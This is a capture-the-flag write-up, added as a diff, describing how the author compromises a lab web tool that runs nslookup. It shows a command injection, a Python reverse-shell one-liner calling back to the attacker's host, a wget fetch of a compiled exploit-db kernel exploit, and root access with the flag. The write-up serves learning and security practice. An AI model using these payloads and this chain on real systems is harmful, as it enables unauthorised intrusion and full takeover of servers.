@@ -1,0 +1,83 @@
+# Super Helpful Investigator Tool  
+- Category : Red
+- Points : N/A 
+- Flag: 27a5148ea0fbddae22d902bea9a19531
+
+
+## Challenge
+
+Was provided with the IP address of `172.20.170.50`. 
+
+## Solve
+
+1) Since I was only provided with an IP address, I used `nmap -sV 172.20.170.50` to see what ports were open. This returned with:
+```
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        nginx 1.4.6 (Ubuntu)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: SUPER-HELPFUL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+The port 80 http service stood out to me the most because that means there is a webserver running. So, I put the IP address in my webrowser and was presented with the `Super Helpful Investigation Tool`. This page contained a search box in the form of: "Domain: (enter domain here) Investigate (a button to conduct the search)".
+
+2) Now that I am on the website, I took a look around. I wanted to see how the searchbar worked and if there was anything else on the website. First, I used dirb to check for other directories, but there was none. Secondly, I started inoutting domains into the search bar. I started with `google.com` which returned with: 
+```
+Server: 172.20.170.1
+Address: 172.20.170.1#53
+
+Non-authoritative answer:
+Name: google.com
+Address: 172.217.15.110 
+```
+Ok, it's returning some kind of additional information on google.com, but what does this mean? At this point, I was reminded about the command `nslookup`. I researched what it did and used it on my local machine for google.com. It returned with almost the exact same thing that the super helpful tool did. This is interesting. 
+
+3) I now realised that the super helpful tool was just running an nslookup command on whatever domain I provided it with. Now, I had to try and figure out how this can get me the flag. It seemed legit and that it only ran the nslookup command, but I had to exploit it in a way that could get me further.
+
+4) I then researched how to string multiple commands in bash so that maybe I could conduct an injection and do something the app isn't supposed to do. This website provides a simple exaplanation of how to do this: https://dev.to/0xbf/run-multiple-commands-in-one-line-with-and-linux-tips-5hgm. I used this knowledge to attempt to run a second command. I inserted `google.com; ls -l` into the super helpful tool to see if it would list out some files for me. It did! This listed an `app.py` and `app.pyc` file. Cool. Now that I know I can insert other commands besides just a domain, I looked deeper. 
+
+5) At this point, I wanted to see what was within the `app.py` file so I used `google.com ; cat app.py`. This was the backbone of the super helpful tool and verified that it indeed was using the nslookup command. 
+
+6) Now that I know what the tool does, I needed a way to get a reverse shell so I could get on the box. But, I have never done this. So, I researched how to get a reverse shell, what a reverse shell is, and how to setup listeners. After knowing how the whole process works, I started looking for a reverse shell one liner that I could inject into the super helpful tool. I landed on: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python - which contained a bunch of reverse shell one liners. 
+
+7) Now that I knew what I needed to do, I got to work. I set up a listener on my machine using `nc -lvnp 1234`. With this running I tested a bunch of one liners, ultimately ending up with: `google.com ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.170.24",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`. Since the listener was on, once I sent the reverse shell one liner through the super helpful tool the following was on my computer: 
+```
+Listening on 0.0.0.0 1234
+Connection received on 172.20.170.50 45625
+/bin/sh: 0: can't access tty; job control turned off 
+$ 
+```
+8) Once I saw the dollar sign, I knew I had a reverse shell! But, we aren't done and the flag is not available yet. This is because we were still on the `labnet` account, which is the user hosting the super helpful tool (this just means it doesn't have root privelages and that it only contained the app.py file). I used `whoami` to confirm this. 
+
+I then used `uname -a` to look at the system information and see what is vulnerable for me to exploit. I noticed that the system was running on version 3.13, so I went to https://www.exploit-db.com to search for an exploit. 
+
+I found: https://www.exploit-db.com/exploits/37292. It seemed to match the information I had and do what I needed, so I downloaded it onto my system. 
+
+9) I then needed to download and upload the exploit onto the vulnerable box for execution. I used  `gcc exploit.c -o exploit` to decompile the exploit file and a python server (`python3 -m http.server 9999`) so I can use wget on the vulnerable machine and download the exploit file. 
+
+Since I had the python3 server stoodup, I used `wget http://172.20.170.24:9999/exploit` on the vulnerable machine. But, I received two errors saying: `exploit: Permission denied` and `Cannot write to 'exploit' (Permission denied)`. I then used `pwd` to see that I was in the `/home/www/super-helpful-investigation-tool` directory.I then found out that I should be doing this in the `/tmp `directory since it gets cleared when the server gets restarted and usually lets you write and execute things. After being in the tmp directory I redownloaded the exploit, and it worked! Another thing I learned at this point, was that if the system already has gcc, I could have compiled the exploit on their system instead of doing it before hand. This can be checked with `which gcc`. 
+
+After the exploit was on their machine, I then used `chmod +x exploit` to make the exploit file executable and ran it using `./exploit`. After executing the exploit, I got 
+```
+spawning threads 
+mount #1
+mount #2
+child threads done 
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off 
+# 
+``` 
+I saw the pound sign and knew it worked! I then used `whoami` to make sure I was root, and I was.
+
+Finally, I did `ls -a` to list the files and `cat flag.json` to read the flag file containing: 
+```
+{
+    "name": "Super Helpful Investigation Tool", 
+    "flag": "27a5148ea0fbddae22d902bea9a19531" 
+}
+```
+
+## Thoughts
+
+This was my first time getting a reverse shell and executing an exploit on a box. I learned a lot about the pentester methedology and how to go about solving problems. I also like how this challenge was multi layered and how there was a lot of figuring out how things worked. I learned how to download an exploit from `exploit-db`, compile it, and execute it on the vulnerable box. I have never done this before, so this was extremely valuable to my red team progression. Finally, I feel confident that I will be able to use the thinking process used here,for other problems. This is a challenge that I will never forget. 
